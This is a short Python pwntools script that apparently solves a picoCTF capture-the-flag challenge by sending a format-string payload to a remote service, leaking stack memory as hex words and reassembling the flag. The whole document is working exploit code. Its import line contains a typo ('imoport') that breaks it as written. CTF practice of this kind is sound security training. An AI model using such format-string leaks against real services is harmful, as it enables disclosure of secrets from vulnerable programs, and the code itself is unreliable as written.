#!/usr/bin/env python3
from pwn imoport *
import re

conn = remote('mercury.picoctf.net', 59616)
conn.recv()
conn.send(b'1')
conn.recv()
conn.send(b'%08x' + b'-%08x' * 299)
conn.recv()

data = conn.recv().split(b'\n')[4].decode('utf-8')
res = b''
for number in data.split('-'):
    res += bytes.fromhex(number)[::-1]
print(re.search(r'picoCTF{.+}', str(res))[0])
